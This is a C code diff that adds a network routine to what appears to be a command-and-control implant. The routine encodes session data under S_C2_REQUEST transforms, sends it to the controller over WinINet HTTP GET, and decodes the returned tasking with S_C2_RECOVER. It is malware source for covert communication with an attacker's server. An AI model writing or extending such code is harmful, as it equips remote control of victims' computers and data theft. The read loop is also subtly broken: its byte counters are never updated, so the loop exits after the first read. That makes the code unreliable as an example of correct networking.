@@ -2,7 +2,9 @@
 
 #include "network.h"
 
+#include "metadata.h"
 #include "settings.h"
+#include "transform.h"
 
 BOOL gNetworkIsInit = FALSE;
 
@@ -89,4 +91,89 @@ BOOL NetworkCheckResponse(HINTERNET hInternet)
 		return FALSE;
 
 	return atoi(status) == HTTP_STATUS_OK;
+}
+
+HINTERNET gInternetConnect;
+DWORD gNetworkOptions;
+DWORD gContext;
+
+int NetworkGetInternal(const char* uri, SESSION* session, char* data, const int maxGet)
+{
+#define MAX_URI 0x400
+#define MAX_READ 0x1000
+	TRANSFORM transform;
+	memset(&transform, 0, sizeof(transform));
+
+	CHAR finalUri[MAX_URI];
+	memset(finalUri, 0, sizeof(finalUri));
+
+	TransformInit(&transform, maxGet);
+	snprintf(transform.uri, MAX_URI, "%s", uri);
+
+	TransformEncode(&transform, S_C2_REQUEST, session->data, session->length, NULL, 0);
+
+	if(strlen(transform.uriParams))
+		snprintf(finalUri, sizeof(finalUri), "%s%s", transform.uri, transform.uriParams);
+	else
+		snprintf(finalUri, sizeof(finalUri), "%s", transform.uri);
+
+	HINTERNET hInternet = HttpOpenRequestA(
+		gInternetConnect, 
+		"GET", 
+		finalUri, 
+		NULL, 
+		NULL, 
+		NULL, 
+		gNetworkOptions, 
+		&gContext);
+
+	NetworkUpdateSettings(hInternet);
+
+	HttpSendRequestA(hInternet, transform.headers, strlen(transform.headers), transform.body, transform.bodyLength);
+	TransformDestroy(&transform);
+
+	if(!NetworkCheckResponse(hInternet))
+	{
+		InternetCloseHandle(hInternet);
+		return -1;
+	}
+
+	DWORD bytesAvailable = 0;
+	if(!InternetQueryDataAvailable(hInternet, &bytesAvailable, 0, 0))
+	{
+		InternetCloseHandle(hInternet);
+		return -1;
+	}
+
+	if (bytesAvailable >= maxGet)
+	{
+		InternetCloseHandle(hInternet);
+		return -1;
+	}
+
+	if(bytesAvailable == 0)
+	{
+		InternetCloseHandle(hInternet);
+		return 0;
+	}
+
+	if(maxGet == 0)
+	{
+		InternetCloseHandle(hInternet);
+		return -1;
+	}
+
+	int totalBytesRead = 0;
+	int bytesRead = 0;
+	do
+	{
+		if(!InternetReadFile(hInternet, data + totalBytesRead, MAX_READ, &bytesAvailable) || bytesRead == 0)
+		{
+			InternetCloseHandle(hInternet);
+			return TransformDecode(S_C2_RECOVER, data, totalBytesRead, maxGet);
+		}
+	} while (totalBytesRead < maxGet);
+
+	InternetCloseHandle(hInternet);
+	return -1;
 }
